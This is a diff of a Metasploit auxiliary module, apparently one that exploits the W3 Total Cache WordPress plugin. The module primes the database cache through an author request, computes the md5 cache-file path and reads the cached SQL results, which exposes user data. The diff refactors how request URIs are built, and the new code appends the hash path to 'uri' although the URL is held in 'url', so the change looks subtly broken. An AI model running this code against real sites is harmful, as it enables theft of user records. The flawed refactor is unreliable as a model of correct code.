@@ -2,7 +2,7 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
-#	 http://metasploit.com/
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -55,9 +55,17 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Call the User site, so the db statement will be cached
 	def cache_user_info(user_id)
-		user_url = normalize_uri("/#{wordpress_url}?author=#{user_id}")
+		user_url = normalize_uri(wordpress_url)
 		begin
-			send_request_cgi({ "uri" => user_url, "method" => "GET" })
+			send_request_cgi(
+				{
+					"uri"      => user_url,
+					"method"   => "GET",
+					"vars_get" => {
+						"author" => user_id.to_s
+					}
+				})
+
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 			vprint_error("Unable to connect to #{url}")
 			return nil
@@ -83,7 +91,8 @@ class Metasploit3 < Msf::Auxiliary
 				key="w3tc_#{host}_#{site_id}_sql_#{query_md5}"
 				key_md5 = ::Rex::Text.md5(key)
 				hash_path = "/#{key_md5[0,1]}/#{key_md5[1,1]}/#{key_md5[2,1]}/#{key_md5}"
-				url = normalize_uri("/#{wordpress_url}#{datastore["WP_CONTENT_DIR"]}/w3tc/dbcache#{hash_path}")
+				url = normalize_uri(wordpress_url, datastore["WP_CONTENT_DIR"], "/w3tc/dbcache")
+				uri << hash_path
 
 				result = nil
 				begin
